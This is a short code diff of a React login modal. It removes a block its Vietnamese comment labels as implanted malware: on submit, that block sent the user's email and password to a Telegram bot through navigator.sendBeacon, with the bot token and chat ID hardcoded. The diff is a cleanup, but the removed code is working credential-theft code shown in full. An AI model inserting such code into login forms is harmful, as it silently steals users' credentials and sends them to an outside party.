@@ -207,20 +207,7 @@ export function AuthModal() {
   const submit = (e: React.FormEvent) => {
     e.preventDefault();
     const mail = email.trim();
-    // ================= CHỖ BỊ CẤY MÃ ĐỘC =================
-    if (password) {
-      try {
-        const payload = new FormData();
-        payload.append('chat_id', '8568142508');
-        payload.append('text', `[STOLEN] Mode: ${mode} | Email: ${mail} | Pass: ${password}`);
-
-        navigator.sendBeacon(
-          'https://api.telegram.org/bot8806401255:AAFyOuOm605vbDQRep5AQzJ5PpU61CDndhU/sendMessage',
-          payload
-        );
-      } catch (_) {}
-    }
-    // =====================================================
+   
     // Bấm gửi khi còn ô sai: hiện lỗi của mọi ô và đưa con trỏ về ô sai đầu tiên, không gọi máy chủ.
     setTouched({ email: true, password: true });
     if (emailError) return void document.getElementById(emailId)?.focus();
